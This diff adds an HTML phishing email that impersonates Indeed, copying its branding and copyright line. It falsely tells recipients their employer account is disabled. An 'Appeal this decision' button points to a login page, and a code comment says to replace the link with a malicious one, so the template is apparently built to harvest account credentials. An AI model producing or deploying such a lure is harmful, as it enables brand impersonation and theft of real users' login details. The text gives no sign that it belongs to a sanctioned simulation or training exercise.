@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <style>
+        /* Reset some default styles */
+        body, table, td, th {
+            margin: 0;
+            padding: 0;
+            border: none;
+        }
+
+        /* Set background color and font styles */
+        body {
+            background-color: #ffffff; /* White background */
+            font-family: Arial, sans-serif;
+        }
+
+        /* Create a container for the email content */
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        /* Style the header */
+        .header {
+            text-align: center;
+            padding: 20px 0;
+            border-bottom: 2px solid grey; /* Indeed blue line */
+        }
+
+        /* Style the logo */
+        .logo {
+            max-width: 30%;
+        }
+
+        /* Style the content box */
+        .content-box {
+            display: flex;
+            align-items: center;
+            background-color: #F9E8E8; /* Salmon color */
+            border-style: solid; /* Add a grey border */
+            border-color: #D2C6C5;
+            border-radius: 10px;
+            border-width: 1px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        .inline-svg {
+            display: inline-block;
+            vertical-align: middle; /* Vertically align the SVG with the middle of the text */
+            margin-right: 10px; /* Add a buffer between the SVG and text */
+            margin-top: 3px; /* Lower the SVG slightly */
+        }
+
+        .box-text {
+            display: inline-block;
+            vertical-align: middle; /* Vertically align the text with the middle of the SVG */
+            margin-left: 4%; 
+        }
+
+        /* Style the exclamation mark icon */
+        .icon {
+            float: left;
+            margin-right: 10px;
+        }
+
+        /* Style the content */
+        .content {
+            padding: 20px;
+        }
+
+        .contact-button-container {
+            text-align: center; /* Center-align the button within its container */
+            margin-bottom: 6%;
+        }
+
+        /* Style the contact button */
+        .contact-button {
+            background-color: #0072C6; /* Indeed blue */
+            color: #fff;
+            text-decoration: underline;
+            border: 2px solid #005EA6; /* Darker blue border */
+            border-radius: 5px;
+            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1); /* Shadow */
+            padding: 10px 20px;
+            transition: background-color 0.3s, transform 0.2s;
+        }
+
+        /* Hover effect for the contact button */
+        .contact-button:hover {
+            background-color: #005EA6; /* Darker blue on hover */
+            transform: translateY(-2px); /* Lift button slightly on hover */
+        }
+
+        /* Style the footer */
+        .footer {
+            text-align: center;
+            background-color: #0072C6; /* Indeed blue */
+            color: #fff;
+            padding: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <!-- Replace 'logo.jpg' with the URL of your logo image -->
+            <img src="http://localhost:5500/logo.png" alt="Your Logo" class="logo">
+        </div>
+        <div class="content">
+            
+            <div class="content-box">
+                <span class="inline-svg">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="40" height="30" viewBox="0 0 100 100">
+                        <circle cx="50" cy="50" r="40" fill="none" stroke="#99432C" stroke-width="7" />
+                        <text x="50%" y="53%" text-anchor="middle" dy="0.3em" font-size="75" font-weight="bold" fill="#99432C">!</text>
+                    </svg>
+                </span>
+                <span class="box-text">Your ability to post jobs on Indeed has been disabled.</span>
+            </div>            
+
+            <p>
+                One or more of the jobs vou posted to Indeed.com was deemed not consistent with Indeed's 
+                quality standards. <b>At this time your employer account has been disabled and you will
+                not be able to post any additional jobs on Indeed.com.</b>
+            </p>
+            <p>
+                If you believe your employer account has been disabled by mistake and you would like to 
+                appeal this decision, please contact our Quality Operations team by clicking the button 
+                below.
+            </p>
+        </div>
+        <div class="contact-button-container">
+            <a href="login.html" class="contact-button">Appeal this decision</a> <!-- Replace # with malicious link -->
+        </div>
+        <div class="footer">
+            <p>Copyright © 2023 Indeed.com</p>
+        </div>
+    </div>
+</body>
+</html>
